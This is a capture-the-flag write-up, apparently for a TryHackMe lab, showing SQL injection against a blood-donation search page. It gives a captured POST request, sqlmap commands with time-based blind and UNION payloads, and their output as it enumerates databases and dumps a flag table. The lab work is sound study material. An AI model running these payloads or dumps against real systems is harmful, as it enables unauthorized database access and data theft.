# Blood Donation

- From directory enumeration we find a creepy `/blood` directory

- Lets find the user of the db
- From burp suite we have done a post request

```sh
└─$ cat sql.txt 
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.27.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
Origin: http://10.10.27.3
Connection: close
Referer: http://10.10.27.3/blood/nl-search.php
Cookie: PHPSESSID=0dbfv9iasvci0o2vn9r3t93sd5
Upgrade-Insecure-Requests: 1

blood_group=B%2B                                                                                                         
```
- `blood_group=` seem the vulnerable parameter
- I have copied the burp proxies request in `sql.txt` in my machine

1. `sqlmap -r sql.txt -p blood_group --dbs`
```sh
sqlmap -r sql.txt -p blood_group --dbs

Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 7359 FROM (SELECT(SLEEP(5)))yBVR) AND 'KZNt'='KZNt

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71706b7671,0x59766366485a446b4e6262556569746e63454e427a664b525074725343746c784c564545784a6f4c,0x7170766a71),NULL-- -
---
[09:22:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
[09:22:44] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test

```

2. `sqlmap -r sql.txt -p blood_group --current-user`

```sh
└─$ sqlmap -r sql.txt -p blood_group --current-user

current user: 'root@localhost'

```
3. `sqlmap -r sql.txt -D blood --tables`

```sh
└─$ sqlmap -r sql.txt -D blood --tables            
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+

```

4. `sqlmap -r sql.txt -D blood -T flag --dump`

```sh
└─$ sqlmap -r sql.txt -D blood -T flag --dump


        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org


+----+---------------------+--------+
| id | flag                | name   |
+----+---------------------+--------+
| 1  | thm{sqlm@p_is_L0ve} | flag   |
+----+---------------------+--------+


```
